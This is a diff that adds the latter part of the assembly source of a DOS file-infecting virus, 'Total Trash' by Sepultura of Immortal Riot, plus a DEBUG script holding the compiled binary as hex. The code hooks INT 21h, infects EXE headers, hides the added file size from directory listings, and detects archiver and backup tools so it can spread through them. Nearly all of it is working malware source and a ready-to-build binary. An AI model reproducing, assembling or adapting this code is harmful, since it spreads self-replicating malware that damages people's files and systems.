+		push	wo cs:[di.exe_ip]
+		pop	wo ds:[si+12h]		; set clean ip
+
+		i21	62h
+		add	bx,10h			; bx = base segment
+		mov	cx,bx
+
+		add	cx,wo cs:[di.exe_cs]
+		mov	wo ds:[si+14h],cx	; set clean cs
+		
+		mov	ax,wo cs:[di.exe_ss]	
+		add	ax,bx
+		mov	es,ax			
+		mov	di,wo cs:[di.exe_sp]    ; ES:DI = clean SS:SP
+		dec	di			; simulate PUSH (SP-=2)
+		dec	di
+		pop	wo es:[di]		; callers AX pushed on stack
+		mov	wo ds:[si+0Eh],di	; set SS:SP
+		mov	wo ds:[si+10h],es
+
+_4B01_abort:	jmp	return
+
+;============================================================================
+
+
+
+;=[AH=4Ch - Terminate]=======================================================
+;
+; The program is terminating and returning to its parent program so we set
+; the bahaviour status back to the default. 4B00h also comes here. If the
+; parent program is DOS, set_status will update the status.
+
+i21_4C:		mov	by cs:[status],file_stealth + size_stealth
+_i21_exit_b:	jmp	_i21_exit_a
+
+;============================================================================
+
+
+
+;=[AH=4Eh - ASCIIZ Find First]===============================================
+;
+; Like AH=11h/12h we have to open the file, and thus since only the filename
+; is returned in the DTA we need to save the path specified in the search 
+; string (DS:DX) on the Find First call. We save the path and the position
+; where the path ends and actual filemask starts, so on each Find call after
+; that we can append the filename to the path and open it.
+
+i21_4E:		mov	si,dx
+		mov	di,ofs fn_buffer
+		mov	wo cs:[back_slash],di
+
+_4E_loop:	lodsb			; save the path so we can open
+		stosb			; the files later.
+		cmp	al,'\'
+		je	_4El_bs
+		cmp	al,':'
+		jne	_4E_nbs
+_4El_bs:	mov	wo cs:[back_slash],di
+_4E_nbs:	or	al,al
+		jnz	_4E_loop
+
+;		( Continues onto i21_4F )
+
+;============================================================================
+
+
+
+;=[AH=4Fh - ASCIIZ Find Next]================================================
+;
+; This takes the path we saved at 4Eh, appends the filename, opens the file
+; then does pretty much the same thing 11h/12h.
+
+i21_4F:		call	set_status
+		test	by cs:[status],size_stealth+size_mirror
+		jz	_i21_exit_b
+
+		call	chain_21	; do the find
+		cld
+		jnc	_4F_success
+
+_4F_exit:	jmp	return
+
+_4F_success:	i21	2Fh		; ES:BX = DTA (1Ah=size, 1Eh=name)
+		mvs	ds,es
+
+		cmp	wo ds:[bx+1Ah.hi],0	; skip bad sized files
+		jne	_4F_ch
+		cmp	wo ds:[bx+1Ah.lo],10000
+		jb	_4F_exit
+_4F_ch:		cmp	wo ds:[bx+1Ah.hi],10h
+		ja	_4F_exit
+
+		lea	si,[bx+1Eh]	; DS:SI=name
+		mvs	es,cs
+		mov	di, wo cs:[back_slash]
+		mov	cx,13		; append filename to path
+		rep	movsb
+
+		mvs	ds,cs
+		mov	si,ofs fn_buffer
+		call	check_filename
+		jc	_4F_exit
+				
+		mov	dx,ofs name_buffer
+		i21	3D00h
+		jc	_4F_exit
+		xchg	bx,ax
+
+		call	get_handle_info
+		pushf
+		i21	3Eh
+		i21	2Fh		; ES:BX = DTA
+
+; This is the heart of the size stealthing/mirroring. If the file is infected
+; and we are in size stealth mode we subtract the virus size from the files
+; size. If the file is infectable and we are in file mirror mode we add the
+; virus size to the file size.
+
+sizer:		popf
+		jc	_4F_exit
+		jz	_4F_stealth
+
+		test	by cs:[status],size_mirror
+		jz	_4F_exit_b
+		add	wo es:[bx+1Ah.lo],size
+		adc	wo es:[bx+1Ah.hi],0
+_4F_exit_b:     jmp	_4F_exit
+
+_4F_stealth:	test	by cs:[status],size_stealth
+		jz	_4F_exit_b
+		sub	wo es:[bx+1Ah.lo],size
+		sbb	wo es:[bx+1Ah.hi],0
+		jmp	_4F_exit_b
+		
+;============================================================================
+
+
+
+;=[AH=6Ch - Extended file open]==============================================
+;
+; This is basically identical to function 3Dh.
+
+i21_6C:		test	by ss:[bp._bx.lo],1		; Write only?
+		jz	_6C_r
+		dec	by ss:[bp._bx.lo]
+		or	by ss:[bp._bx.lo],2 
+
+_6C_r:		jmp	_3D_6C
+
+;============================================================================
+
+
+
+;=[chain INT 21h]============================================================
+
+chain_21:	pop	wo cs:[tmp_ret]
+		restore
+		pushf			; POPF, PUSHF is nescessary
+		call	dwo cs:[vector]
+		save
+		jmp	wo cs:[tmp_ret]
+						
+;============================================================================
+
+
+
+;=[Various Seeking Routines]=================================================
+
+seek_to_start:	mov	al,0
+
+		db	03Dh		; CMP AX,xxxx (like a JMP)
+get_file_ptr:	mov	al,01
+
+		db	03Dh
+seek_to_end:	mov	al,02
+
+		mov	ah,42h + 'G'	; do the seek
+		zero	cx
+		zero	dx
+
+;		(Continues onto int_21)
+
+;============================================================================
+
+
+
+;=[Call INT 21h]=============================================================
+
+int_21:		pop	wo cs:[tmp_ret]
+		pushf
+		sub	ah,'G'
+vi21:		push	cs
+		push	wo cs:[tmp_ret]
+		jmp	jmp_vector
+		
+;============================================================================
+
+
+
+;=[Gets All We Need to Know About a Handle]==================================
+;
+; Returns: 	NC,NZ if file is not infected, but infectable.
+;		NC,ZF if file is infected.
+;		CF,NZ if file is not infected, and not infectable.
+;
+
+get_handle_info:i21	4400h
+		or	dl,dl
+		jns	ghi0
+
+		stc
+		ret
+
+ghi0:		mvs	ds,cs
+		mvs	es,cs
+		call	get_file_ptr
+		push	ax dx			; save file position (DAX)
+
+		call	seek_to_end			; save file length
+		mov	wo ds:[clean_size.hi],dx
+		mov	wo ds:[clean_size.lo],ax
+		mov	wo ds:[infected_size.hi],dx
+		mov	wo ds:[infected_size.lo],ax
+
+		call	seek_to_start		; read header
+		mov	cx,header_size
+		mov	dx,ofs infected_header
+		mov	si,dx
+		i21	3Fh
+		cmp	ax,cx
+		jb	ghi_exit
+
+		mov	cx,header_size		; copy infected header
+		mov	di,ofs clean_header
+		push	di
+		rep	movsb
+		pop	si
+
+		call	check_header
+		je	ghi_infected	; make disinfection info (infected)
+		jnc	ghi1
+				; file cant be infected, so exit with CF.
+
+ghi_exit:	pop	cx dx	; restore file ptr (CDX)
+		pushf
+		i21	4200h
+		popf
+		ret
+
+ghi1:		add	wo ds:[infected_size.lo],size
+		adc	wo ds:[infected_size.hi],0
+		call	infect_header
+
+		or	al,-1
+		jmp	ghi_exit
+
+ghi_infected:	sub	wo ds:[clean_size.lo],size
+		sbb	wo ds:[clean_size.hi],0
+		call	read_cln_hdr	; read clean header
+		cmp	ax,ax		; set NC, ZF
+		jmp	ghi_exit
+
+;============================================================================
+			    
+
+
+;=[Check if Header is infected/infectable]===================================
+;
+; Assumes:	DS:SI = header
+; 
+; Returns:	NC, NZ if header is not infected but is infectable.
+;		NC, ZF if header is infected.
+;		CF, NZ if header is not infectable.
+;
+;		file ptr = eof
+
+check_header:	mov	ax,wo ds:[si.exe_mz]
+		add	ax,'IR'
+		cmp	ax,'ZM'+'IR'
+		jne	ch_cf
+
+		mov	ax,wo ds:[si.exe_max_mem]
+		inc	ax		; max mem = -1?
+		jnz	ch_cf
+
+		cmp	wo ds:[si.exe_overlay_no],ax	; overlay?
+		jne	ch_cf
+
+		cmp	wo ds:[si.exe_1st_reloc],40h	; NE?
+		jae	ch_cf
+		
+		call	seek_to_end
+		div	_512
+		or	dx,dx
+		jz	ch1
+		inc	ax 		; AX=exe_pages, dx=exe_mod_512
+
+ch1:		cmp	ax,wo ds:[si.exe_pages]
+		jne	ch_cf		; internal overlays?
+		cmp	dx,wo ds:[si.exe_mod_512]
+		je	ch_infectable
+		
+ch_cf:		stc		; not infectable so exit
+		ret
+			 
+ch_infectable:	mov	ax,wo ds:[si.exe_ip]
+		cmp	ax,10h		; IP < 10h
+		jae	ch_chk_size
+
+		add	ax,size+3F0h
+		and	al,NOT 1
+		cmp	ax,wo ds:[si.exe_sp]
+		jne	ch_chk_size	; SP = IP+SIZE+3F0h AND (NOT 1)? 
+		
+		cmp	wo ds:[si.exe_checksum],'IR'
+		jne	ch_chk_size
+		clc
+		ret
+
+ch_chk_size:	cmp	wo ds:[clean_size.hi],0		; not infected so
+		jne	ch_chks_hi			; check for valid
+							; size.
+		cmp	wo ds:[clean_size.lo],10000
+		jb	ch_cf				; too small?
+
+ch_chks_hi:	cmp	wo ds:[clean_size.hi],0010h	; > 1MB?
+		jae	ch_cf
+
+		clc		; NF,NC - not infected but infectable.
+		ret
+
+;============================================================================
+		   
+
+
+;=[Read Clean Header from Infected File]=====================================
+;
+; Assumes DS=CS
+
+read_cln_hdr:	mov	cx,-1
+		mov	dx,(ofs clean_header - ofs vend)
+		i21	4202h			; Seek to Clean Header
+
+		mov	dx,ofs clean_header
+		mov	cx,header_size 
+		i21	3Fh			; Do The Read
+		ret
+
+;============================================================================
+
+
+
+;=[Sets infected header to infected version of clean header]=================
+;
+; Assumes DS=CS
+
+infect_header:	push	es
+
+		mov	si,ofs infected_header
+		les	ax, dwo ds:[clean_size]	; DAX
+		mov	dx,es
+		div	_16
+		sub	ax,wo ds:[si.exe_header_paras]
+		mov	wo ds:[si.exe_cs],ax
+		mov	wo ds:[si.exe_ip],dx
+
+		inc	ax
+		mov	wo ds:[si.exe_ss],ax
+		add	dx,size+3F0h
+		and	dl,NOT 1		; Even SP.
+		mov	wo ds:[si.exe_sp],dx
+
+		cmp	wo ds:[si.exe_min_mem],40h
+		jae	ih_mm
+		mov	wo ds:[si.exe_min_mem],40h
+
+ih_mm:		les	ax, dwo ds:[infected_size]
+		mov	dx,es			; DAX
+		div	_512
+		or	dx,dx
+		jz	ih1
+		inc	ax 		; AX=exe_pages, dx=exe_mod_512
+
+ih1:		mov	wo ds:[si.exe_pages],ax
+		mov	wo ds:[si.exe_mod_512],dx
+		mov	wo ds:[si.exe_checksum],'IR'
+
+		pop	es
+		ret
+
+;============================================================================
+
+
+
+;=[Get Bit/Byte offset into Table Entry]=====================================
+;
+; assumes:	BX=Handle
+;
+; output:	DI=Byte
+; 		CL=Bit
+
+get_handle_entry:mov	cx,bx
+		mov	di,bx
+		and	cl,011b			; CL=0,1,2,3
+		add	cl,cl			; CL=0,2,4,6
+		shr	di,2			; DI=byte, CL=bit
+		add	di,ofs handle_table
+		ret
+
+;============================================================================
+
+
+
+;=[Check out the active task]================================================
+;
+; m=mirrored, s=stealth, n=none
+;
+; ACTIVITY	file	size
+;---------------------------
+; DOS		m	s
+; Archivers	m	m
+; Disk Utils	n	n
+; Default	s	s
+
+set_status:	push	bx di
+		push	ds es
+
+		i21	62h		; Get current PSP
+		mov	ds,bx
+
+		mov	dl,file_mirror + size_stealth
+		cmp	wo ds:[0016h],bx
+		je	ss_exit		; DOS
+
+		cld
+		mov	dl,size_mirror + file_mirror
+		dec	bx
+		mov	es,bx
+		mov	si,ofs archivers
+		mvs	ds,cs
+
+ss_arc_loop:	mov	di,ofs mcb_name
+		lodsb
+		cbw
+		inc	ax
+		jz	ss_not_arc
+		xchg	cx,ax
+		repe	cmpsb
+		je	ss_exit 	; archiver
+		add	si,cx
+		jmp	ss_arc_loop
+
+ss_not_arc:
+		; status for Disk Utils and Default are set by DOS functions
+		; 32h and 31h/4Ch respectively
+
+		jmp	ss_exit2
+ss_exit:	mov	by cs:[status],dl
+
+ss_exit2:	pop	es ds
+                pop	di bx
+		ret
+
+;============================================================================
+
+
+
+;=[Clears the Entry for Handle in BX]========================================
+;
+; assumes:	BX=Handle
+
+clr_handle_entry:push	ax
+
+		call	get_handle_entry
+		
+		mov	al,NOT 011b
+		shl	al,cl
+		and	by cs:[di],al
+
+		pop	ax
+		ret
+
+;============================================================================
+
+
+
+;=[Compares DX:AX with DWORD ptr CS:[si]]====================================
+;
+; CMP DAX,CS:[SI]
+
+cmpd:		cmp	dx,wo cs:[si.hi]
+		jne	cmpd_ret
+		cmp	ax,wo cs:[si.lo]
+cmpd_ret:	ret
+
+;============================================================================
+
+
+
+;=[DATA]=====================================================================
+
+archivers:	db	1,	'PK'	; PKLITE,PKZIP
+		db	1,	'LL'	; laplink
+		db	1,	'UC'	; ultracompressor
+		db	2,	'LZE'	; LZEXE
+		db	2,	'LHA'	; LHA,LHARC
+		db	2,	'RAR'	; RAR
+		db	2,	'ARJ'	; ARJ
+		db	2,	'ZIP'	; ZIP
+		db	2,	'TEL'	; TELIX, TELEMATE
+		db	2,	'XCO'	; XCOPY
+		db	2,	'BAC'	; BACKUP
+		db	2,	'QMO'	; QMODEM
+		db	3,	'MSBA'	; MSBACKUP
+		db	3,	'CPBA'	; CPBACKUP
+
+
+		db	-1
+
+clean_header	dw	0,0,0,0,0,0,0,-10h,0FFEh,0,0,-10h,0,0
+
+vend:
+;-[END VIRUS ON DISK]--------------------------------------------------------
+
+infected_header	db	header_size dup (?)
+
+clean_size	dd	?
+infected_size	dd	?
+
+tmp_ret		dw	?
+
+handle_table	db	64 dup (?)	; Support 256 handles.
+
+status		db	?
+
+name_buffer	db	128 dup (?)
+
+fn_buffer	db	128 dup (?)
+
+orig_ptr	dd	?
+read_cx		dw	?
+back_slash	dw	?
+
+mend:
+;-[END VIRUS IN MEMORY]------------------------------------------------------
+
+		end	main
+
+;=[END TT.ASM]===============================================================
+
+
+
+;=[BEGIN TT.SCR]=============================================================
+
+ N TT.COM
+ E 0100 FC 1E B4 30 BA 52 49 B9 00 02 CD 21 8B EC 8B 6E
+ E 0110 FA 81 ED 0C 00 0B D2 75 0C 8B F5 33 FF B9 29 02
+ E 0120 2E F3 A6 74 37 8C D8 48 8E D8 33 FF 80 3D 5A 75
+ E 0130 2B 03 45 03 2D 9F 00 8E C0 8B F5 B9 E8 09 2E F3
+ E 0140 A4 BF 9F 08 32 C0 B1 41 F3 AA 1F 1E BE 0A 00 BF
+ E 0150 29 02 A5 A5 C7 44 FC 9F 00 8C 44 FE 58 8B D8 05
+ E 0160 10 00 8D B6 5D 08 2E 01 44 16 2E 01 44 0E 8E DB
+ E 0170 8E C3 FA 2E 8B 64 10 2E 8E 54 0E FB F8 2E FF 6C
+ E 0180 14 20 5B 54 6F 74 61 6C 20 54 72 61 73 68 5D 20
+ E 0190 62 79 20 53 65 70 75 6C 74 75 72 61 2E 20 00 9C
+ E 01A0 60 06 1E FC 33 F6 33 FF BB 9F 00 B4 48 CD 21 72
+ E 01B0 13 8E C0 48 8E D8 C7 44 01 08 00 B9 E8 09 2E F3
+ E 01C0 A4 E8 03 00 E9 5D 01 06 B8 06 33 CD 21 80 FB FF
+ E 01D0 74 0A F6 C6 10 74 05 E8 1B 00 73 06 6A 00 07 BF
+ E 01E0 84 00 8B F7 06 1F BF 29 02 07 A5 A5 C7 44 FC 8C
+ E 01F0 01 8C 44 FE C3 B4 52 CD 21 BF 00 0E B9 00 04 BD
+ E 0200 03 00 B8 90 90 AF 74 0D 26 81 7D 02 EB 00 74 05
+ E 0210 4F E2 F2 F9 C3 26 80 3D E8 75 EA 26 81 7D 02 00
+ E 0220 2E 75 E2 26 81 7D 04 FF 2E 75 DA 4D 75 D7 26 8B
+ E 0230 7D 06 F8 C3 0E 07 BF E0 08 B4 A7 E8 2E 05 72 49
+ E 0240 B9 80 00 32 C0 F2 AE 26 81 7D FB 2E 45 75 3B 26
+ E 0250 81 7D FD 58 45 75 33 B9 0D 00 B0 5C FD F2 AE 47
+ E 0260 FC 26 80 3D 53 74 23 26 81 3D 54 42 74 1C 26 8A
+ E 0270 05 3C 2E 74 13 3C 56 74 11 3C 39 77 08 3C 30 73
+ E 0280 09 3C 2D 74 05 47 EB E6 F8 C3 F9 C3 9C 60 06 1E
+ E 0290 FC 8B EC FA 68 52 49 5F 4C 4C 59 3B F9 74 03 E9
+ E 02A0 9E 00 0E 07 86 C4 BF B9 01 B9 11 00 F2 AE 81 EF
+ E 02B0 BA 01 03 FF 2E FF A5 CA 01 11 12 30 32 3D 3E 3F
+ E 02C0 40 42 45 46 4B 4C 4E 4F 6C FF 2D 02 2D 02 BA 02
+ E 02D0 E1 02 E9 02 1F 03 28 03 4D 04 B4 04 F4 04 14 05
+ E 02E0 1A 05 80 05 89 05 A6 05 36 06 24 02 20 49 6D 6D
+ E 02F0 6F 72 74 61 6C 20 52 69 6F 74 2F 47 65 6E 65 73
+ E 0300 69 73 20 2D 20 50 75 6E 69 73 68 69 6E 67 20 59
+ E 0310 6F 75 72 20 4D 61 63 68 69 6E 65 20 69 6E 20 27
+ E 0320 39 36 20 00 1F 07 61 9D EA 00 00 00 00 E8 A3 05
+ E 0330 2E F6 06 DF 08 03 74 EC E8 0B 04 FC 0A C0 74 07
+ E 0340 1F 07 61 9D CA 02 00 B4 76 E8 20 04 06 1F 80 3F
+ E 0350 FF 75 03 83 C3 07 83 7F 1F 00 75 07 81 7F 1D 10
+ E 0360 27 72 DD 83 7F 1F 10 77 D7 8D 77 01 0E 07 BF 60
+ E 0370 09 57 8A 07 0A C0 74 05 04 40 B4 3A AB A5 A5 A5
+ E 0380 A5 B0 2E AA A5 A4 32 C0 AA 0E 1F 5E E8 A5 FE 72
+ E 0390 AF BA E0 08 B8 00 84 E8 D2 03 72 A4 93 E8 DE 03
+ E 03A0 9C B4 85 E8 C6 03 B4 76 E8 C1 03 26 80 3F FF 75
+ E 03B0 03 83 C3 07 83 C3 03 E9 4D 03 81 FA 52 49 75 1E
+ E 03C0 81 7E 10 00 02 75 17 C4 7E 16 81 EF 0C 00 B9 29
+ E 03D0 02 33 F6 2E F3 A6 75 06 89 4E 0E 8C 4E 02 E9 43
+ E 03E0 FF 2E C6 06 DF 08 00 EB F5 F6 C4 01 74 07 FE 4E
+ E 03F0 12 80 4E 12 02 8B F2 E8 3A FE 9C E8 D5 04 9D 72
+ E 0400 DD E8 42 03 72 16 93 E8 74 03 B4 00 72 06 B4 01
+ E 0410 74 02 B4 02 E8 F7 04 D2 E4 2E 08 25 E9 21 FF E8
+ E 0420 EC 04 E8 AE 04 E9 FC FE 0E 1F E8 34 03 89 16 E2
+ E 0430 09 A3 E0 09 83 66 14 FE E8 87 04 8A 2D D2 ED F6
+ E 0440 06 DF 08 04 74 08 E8 35 03 75 DA E9 BD 00 F6 06
+ E 0450 DF 08 08 74 D0 F6 C5 02 74 CB E8 21 03 33 FF BE
+ E 0460 99 08 E8 B6 04 72 06 89 7E 12 E9 D3 FE BE 95 08
+ E 0470 E8 A8 04 72 24 50 F7 D8 03 06 99 08 B9 79 08 3B
+ E 0480 C8 72 02 8B C8 5E 2B 36 95 08 FF 36 E0 09 FF 36
+ E 0490 E2 09 33 C0 89 46 12 EB 28 E8 AA 02 FC 8B EC 72
+ E 04A0 67 0E 1F 3B C1 74 36 E8 B7 02 BE 95 08 E8 6B 04
+ E 04B0 75 2B 50 52 2B C8 81 F9 79 08 72 03 B9 79 08 33
+ E 04C0 F6 8E 46 00 8B 7E 0E 01 4E 12 51 03 F8 F3 A4 58
+ E 04D0 59 5A 03 D0 83 D1 00 B8 00 89 E8 8F 02 BB 79 08
+ E 04E0 8B 36 E0 09 83 3E E2 09 00 75 1D 83 FE 1C 73 18
+ E 04F0 8B 7E 0E 8E 46 00 8B 4E 12 BA 1C 00 2B D6 3B CA
+ E 0500 72 02 8B CA 03 F3 F3 A4 E9 35 FE 33 FF BE 95 08
+ E 0510 E8 08 04 72 06 89 7E 12 E9 25 FE 8B 4E 10 2E 89
+ E 0520 0E E4 09 03 C1 13 D7 E8 F1 03 72 0A A1 95 08 2B
+ E 0530 06 E0 09 89 46 10 E8 0D 02 8B EC 2E FF 36 E4 09
+ E 0540 8F 46 10 FC 72 C2 0E 1F BB 5D 08 EB 93 E8 72 03
+ E 0550 2E 8A 05 D2 E8 A8 01 74 58 E8 22 02 75 53 E8 00
+ E 0560 02 8B 4E 10 E3 16 0B D2 75 05 3D 1C 00 72 0D 03
+ E 0570 C1 83 D2 00 BE 95 08 E8 A1 03 72 35 2B C1 83 DA
+ E 0580 00 52 50 0E 1F C4 16 95 08 8C C1 B8 00 89 E8 DB
+ E 0590 01 33 C9 B4 87 E8 D4 01 E8 C3 01 BA 5D 08 B9 1C
+ E 05A0 00 B4 87 E8 C6 01 5A 59 B8 00 89 E8 BE 01 E8 5D
+ E 05B0 03 E9 70 FD 80 FC 02 75 F8 E8 06 03 B0 01 2E F6
+ E 05C0 06 DF 08 04 74 12 D2 E0 2E 84 05 74 25 81 6E 0E
+ E 05D0 79 08 83 5E 10 00 EB 1A B0 02 2E F6 06 DF 08 08
+ E 05E0 74 CF D2 E0 2E 84 05 74 09 81 46 0E 79 08 83 56
+ E 05F0 10 00 EB BD E8 4F 01 72 18 50 E8 C5 02 E8 D3 02
+ E 0600 2E 8A 15 D2 EA 80 E2 03 5B E8 02 03 D2 E2 2E 08
+ E 0610 15 E9 08 FE E8 2F 01 91 EB DF 2E 89 1E 41 05 80
+ E 0620 FC 01 77 62 72 5A B8 00 84 E8 40 01 72 58 93 E8
+ E 0630 4C 01 9C B4 85 E8 34 01 9D 75 4B E8 08 01 72 3D
+ E 0640 BE 00 00 06 1F C4 7C 0E 26 FF 35 BF 5D 08 2E FF
+ E 0650 75 14 8F 44 12 B4 A9 E8 12 01 83 C3 10 8B CB 2E
+ E 0660 03 4D 16 89 4C 14 2E 8B 45 0E 03 C3 8E C0 2E 8B
+ E 0670 7D 10 4F 4F 26 8F 05 89 7C 0E 8C 44 10 E9 C0 FC
+ E 0680 2E C6 06 DF 08 05 E9 9C FD 8B F2 BF 60 09 2E 89
+ E 0690 3E E6 09 AC AA 3C 5C 74 04 3C 3A 75 05 2E 89 3E
+ E 06A0 E6 09 0A C0 75 ED E8 2A 02 2E F6 06 DF 08 03 74
+ E 06B0 D5 E8 92 00 FC 73 03 E9 86 FC B4 76 E8 AD 00 06
+ E 06C0 1F 83 7F 1C 00 75 07 81 7F 1A 10 27 72 E9 83 7F
+ E 06D0 1C 10 77 E3 8D 77 1E 0E 07 2E 8B 3E E6 09 B9 0D
+ E 06E0 00 F3 A4 0E 1F BE 60 09 E8 49 FB 72 CA BA E0 08
+ E 06F0 B8 00 84 E8 76 00 72 BF 93 E8 82 00 9C B4 85 E8
+ E 0700 6A 00 B4 76 E8 65 00 9D 72 AD 74 15 2E F6 06 DF
+ E 0710 08 02 74 0B 26 81 47 1A 79 08 26 83 57 1C 00 EB
+ E 0720 96 2E F6 06 DF 08 01 74 F6 26 81 6F 1A 79 08 26
+ E 0730 83 5F 1C 00 EB E9 F6 46 0C 01 74 07 FE 4E 0C 80
+ E 0740 4E 0C 02 E9 B1 FC 2E 8F 06 9D 08 1F 07 61 9D 9C
+ E 0750 2E FF 1E 29 02 9C 60 06 1E 2E FF 26 9D 08 B0 00
+ E 0760 3D B0 01 3D B0 02 B4 89 33 C9 33 D2 2E 8F 06 9D
+ E 0770 08 9C 80 EC 47 0E 2E FF 36 9D 08 E9 AA FB B8 00
+ E 0780 8B E8 E8 FF 0A D2 79 02 F9 C3 0E 1F 0E 07 E8 D0
+ E 0790 FF 50 52 E8 CE FF 89 16 97 08 A3 95 08 89 16 9B
+ E 07A0 08 A3 99 08 E8 B7 FF B9 1C 00 BA 79 08 8B F2 B4
+ E 07B0 86 E8 B8 FF 3B C1 72 11 B9 1C 00 BF 5D 08 57 F3
+ E 07C0 A4 5E E8 33 00 74 1F 73 0B 59 5A 9C B8 00 89 E8
+ E 07D0 9A FF 9D C3 81 06 99 08 79 08 83 16 9B 08 00 E8
+ E 07E0 94 00 0C FF EB E3 81 2E 95 08 79 08 83 1E 97 08
+ E 07F0 00 E8 6A 00 3B C0 EB D1 8B 04 05 52 49 3D 9F A3
+ E 0800 75 27 8B 44 0C 40 75 21 39 44 1A 75 1C 83 7C 18
+ E 0810 40 73 16 E8 4E FF F7 36 08 00 0B D2 74 01 40 3B
+ E 0820 44 04 75 05 3B 54 02 74 02 F9 C3 8B 44 14 3D 10
+ E 0830 00 73 13 05 69 0C 24 FE 3B 44 10 75 09 81 7C 12
+ E 0840 52 49 75 02 F8 C3 83 3E 97 08 00 75 08 81 3E 95
+ E 0850 08 10 27 72 D4 83 3E 97 08 10 73 CD F8 C3 B9 FF
+ E 0860 FF BA E4 FF B8 02 89 E8 02 FF BA 5D 08 B9 1C 00
+ E 0870 B4 86 E8 F7 FE C3 06 BE 79 08 C4 06 95 08 8C C2
+ E 0880 F7 36 60 00 2B 44 08 89 44 16 89 54 14 40 89 44
+ E 0890 0E 81 C2 69 0C 80 E2 FE 89 54 10 83 7C 0A 40 73
+ E 08A0 05 C7 44 0A 40 00 C4 06 99 08 8C C2 F7 36 08 00
+ E 08B0 0B D2 74 01 40 89 44 04 89 54 02 C7 44 12 52 49
+ E 08C0 07 C3 8B CB 8B FB 80 E1 03 02 C9 C1 EF 02 81 C7
+ E 08D0 9F 08 C3 53 57 1E 06 B4 A9 E8 90 FE 8E DB B2 09
+ E 08E0 39 1E 16 00 74 1E FC B2 0A 4B 8E C3 BE 25 08 0E
+ E 08F0 1F BF 08 00 AC 98 40 74 09 91 F3 A6 74 06 03 F1
+ E 0900 EB EF EB 05 2E 88 16 DF 08 07 1F 5F 5B C3 50 E8
+ E 0910 B0 FF B0 FC D2 E0 2E 20 05 58 C3 2E 3B 54 02 75
+ E 0920 03 2E 3B 04 C3 01 50 4B 01 4C 4C 01 55 43 02 4C
+ E 0930 5A 45 02 4C 48 41 02 52 41 52 02 41 52 4A 02 5A
+ E 0940 49 50 02 54 45 4C 02 58 43 4F 02 42 41 43 02 51
+ E 0950 4D 4F 03 4D 53 42 41 03 43 50 42 41 FF 00 00 00
+ E 0960 00 00 00 00 00 00 00 00 00 00 00 F0 FF FE 0F 00
+ E 0970 00 00 00 F0 FF 00 00 00 00
+ RCX
+ 0879
+ W
+ Q
+
+;=[END TT.SCR]===============================================================
+
